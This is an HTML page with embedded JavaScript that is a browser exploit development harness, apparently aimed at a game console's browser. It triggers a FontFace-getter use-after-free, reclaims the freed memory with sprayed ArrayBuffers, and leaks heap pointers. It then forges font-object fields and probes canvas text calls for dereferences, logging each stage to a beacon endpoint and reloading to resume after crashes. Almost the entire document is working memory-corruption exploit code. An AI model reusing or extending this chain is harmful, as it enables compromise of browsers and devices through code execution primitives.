<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P1170 Canvas-Font Fake Object Chain</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
#phase{font-size:16px;color:#00ffee}
#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
</style>
</head><body>
<div id="hud">
  <h1>P1170 — CANVAS FONT-PATH FAKE OBJECT CHAIN</h1>
  <div id="status">BOOTING...</div>
  <div id="phase">phase: init</div>
  <div id="counters">stage: ?</div>
  <div id="finds">no findings yet</div>
</div>
<div id="log"></div>
<script>
'use strict';
var L=document.getElementById('log'),S=document.getElementById('status'),
PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
var T0=Date.now();
function setStatus(t){S.textContent=t;}
function setPhase(t){PH.textContent='phase: '+t;}
function setCounters(t){CT.textContent=t;}
function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
function log(m,c){var d=document.createElement('div');d.className=c||'';
d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
function B(tag,data){try{var u='/beacon.php?tag=P1170-'+encodeURIComponent(tag);
if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
u+='&t='+Date.now();new Image().src=u;}catch(e){}}
window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};

/* ═══════════════════════════════════════════════════════════════════════
   P1170: canvas font-path fake-object chain.
   Verified primitives used ONLY: FL leak (192B cross-type reclaim works
   on our console), canvas ctx.font resolution, same-type alias.
   Grid (crash-resume):
   0: FL leak -> canvas font ops (measureText/fillText with SAME family)
      -> RE-READ reclaimed AB -> which fields did the engine WRITE after
      the canvas ops? (engine-write map = candidate font-object fields)
   1: forge +0x58 with p1 -> measureText (deref test)
   2: forge +0x68 with p2 -> measureText
   3: forge +0x0=0 (flags) -> measureText
   4: forge +0x58 with 0 -> measureText (null-deref control)
   5: fillText variant after forge +0x58=p1
   ═══════════════════════════════════════════════════════════════════════ */

var STAGES=['enginewrite','f58p1','f68p2','f0zero','f58zero','filltext'];
var stage=0,results=[];
try{stage=parseInt(localStorage.getItem('p1170_stage')||'0');}catch(e){}
try{var r=localStorage.getItem('p1170_res');if(r)results=JSON.parse(r);}catch(e){}
if(!Array.isArray(results))results=[];
B('BOOT','stage='+stage+'|'+STAGES[stage]+'|res='+JSON.stringify(results).slice(0,400));
setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);
setCounters('prev: '+JSON.stringify(results).slice(0,300));

if(stage>=STAGES.length){
  setStatus('ALL STAGES DONE');
  B('ALL-DONE',JSON.stringify(results).slice(0,800));
  log('=== ALL DONE ===','ok');
  try{localStorage.removeItem('p1170_stage');}catch(e){}
}else{

try{localStorage.setItem('p1170_stage',''+(stage+1));}catch(e){}
var cur=STAGES[stage];

/* FL leak (returns p1,p2 + the reclaimed 192B AB refs) */
function flLeak(cb){
  setPhase('FL LEAK (FontFace then-getter UAF)');
  var done=false;
  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
  try{
    var fired=false,styleEl;
    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
    document.fonts.add(A);void A.loaded;
    styleEl=document.createElement('style');
    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
    document.head.appendChild(styleEl);
    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
      get:function(){
        if(fired)return undefined;fired=true;
        if(styleEl)styleEl.remove();
        try{document.fonts.delete(this);}catch(e){}
        document.body.offsetHeight;
        window.__map=[];
        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
          window.__map.push({view:new Uint8Array(ab)});}
        try{document.fonts.check('1em s0');}catch(e){}
        return undefined;
      },set:function(){}});
    document.fonts.load('1em f0, s0','AB');
    setTimeout(function(){
      var found=null;
      for(var i=0;i<window.__map.length&&!found;i++){
        var e=window.__map[i];
        var nz=false;for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
        if(nz){
          var dv=new DataView(e.view.buffer);
          var p1=dv.getBigUint64(0x58,true),p2=dv.getBigUint64(0x68,true);
          if(p1>0x1000000000n&&p1<0x100000000000n){
            found={ab:e.view.buffer,
              lo1:Number(p1&0xFFFFFFFFn),hi1:Number((p1>>32n)&0xFFFFFFFFn),
              lo2:Number(p2&0xFFFFFFFFn),hi2:Number((p2>>32n)&0x32n?0:0)||Number((p2>>32n)&0xFFFFFFFFn)};
          }
        }
      }
      B(found?'FL-HIT':'FL-MISS',found?('p1=0x'+found.hi1.toString(16)+found.lo1.toString(16).padStart(8,'0')):'');
      fin(found);
    },80);
  }catch(e){B('FL-ERR',e.message);fin(null);}
}

function dumpAB(ab,label){
  var dv=new DataView(ab);
  var qws=[];
  for(var off=0;off+7<192;off+=8){
    var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
    if(qw!==0n)qws.push('+'+off+'=0x'+qw.toString(16));
  }
  var rep=label+'|'+qws.join(',');
  B('DUMP',rep.slice(0,800));
  log(rep,'info');
  return qws;
}

flLeak(function(leak){
  if(!leak){B('NORETRY');setStatus('FL MISS — retrying');setTimeout(function(){location.reload(true);},400);return;}

  var cv=document.createElement('canvas');cv.width=300;cv.height=50;
  var ctx=cv.getContext('2d');
  ctx.font='20px s0';
  B('FONT-SET','ok');
  setPhase('canvas font ops');

  var mt;
  try{mt=ctx.measureText('ABCDEFGHIJ').width;}catch(e){mt='ERR:'+String(e.message).slice(0,20);}
  B('MEASURE','w='+mt);

  if(cur==='enginewrite'){
    /* baseline dump already read by FL; run MORE font ops then re-dump */
    try{ctx.fillStyle='#ff0000';ctx.fillText('ABCDEFGHIJ',10,40);}catch(e){B('FILL-ERR',String(e.message).slice(0,30));}
    try{document.fonts.check('1em s0');}catch(e){}
    try{document.fonts.load('1em s0','AB');}catch(e){}
    setTimeout(function(){
      var qws=dumpAB(leak.ab,'AFTER-CANVAS');
      results.push({stage:stage,name:cur,measure:mt,qws:qws});
      try{localStorage.setItem('p1170_res',JSON.stringify(results));}catch(e){}
      addFind('engine-write map: '+qws.slice(0,4).join(' '));
      B('NEXT');setTimeout(function(){location.reload(true);},1000);
    },300);
    return;
  }

  /* forge stages */
  var dv=new DataView(leak.ab);
  if(cur==='f58p1'){dv.setUint32(0x58,leak.lo1,true);dv.setUint32(0x5c,leak.hi1,true);}
  if(cur==='f68p2'){dv.setUint32(0x68,leak.lo2,true);dv.setUint32(0x6c,leak.hi2,true);}
  if(cur==='f0zero'){dv.setUint32(0,0,true);dv.setUint32(4,0,true);}
  if(cur==='f58zero'){dv.setUint32(0x58,0,true);dv.setUint32(0x5c,0,true);}
  B('FORGE',cur);
  setPhase('forge '+cur+' -> measureText');

  var w2;
  try{w2=ctx.measureText('ABCDEFGHIJ').width;}catch(e){w2='ERR:'+String(e.message).slice(0,30);}
  B('POST','w='+w2);
  var outcome=(typeof w2==='number')?'SURVIVED:'+w2:'CRASHED?'+w2;
  results.push({stage:stage,name:cur,measure:mt,post:w2,outcome:outcome});
  try{localStorage.setItem('p1170_res',JSON.stringify(results));}catch(e){}
  addFind(cur+' -> '+outcome);
  setStatus('RESULT: '+outcome);
  log('=== '+cur+' -> '+outcome+' ===',typeof w2==='number'?'ok':'warn');

  if(cur==='filltext'){
    try{ctx.fillStyle='#ff0000';ctx.fillText('ABCDEFGHIJ',10,40);B('FILL-OK');}catch(e){B('FILL-ERR',String(e.message).slice(0,30));}
  }
  B('NEXT');setTimeout(function(){location.reload(true);},1200);
});

} /* stage machine */

/* auto-reload checker */
(function(){
  var cur='P1170-fontfake-chain';
  setTimeout(function check(){
    try{
      var x=new XMLHttpRequest();
      x.open('GET','/reload.txt?c='+Date.now(),true);
      x.onload=function(){
        var t=(x.responseText||'').trim();
        if(t&&t!==cur){location.reload(true);return;}
        setTimeout(check,3000);};
      x.onerror=function(){setTimeout(check,5000);};
      x.send();
    }catch(e){setTimeout(check,5000);}
  },4000);
})();
</script>
</body></html>
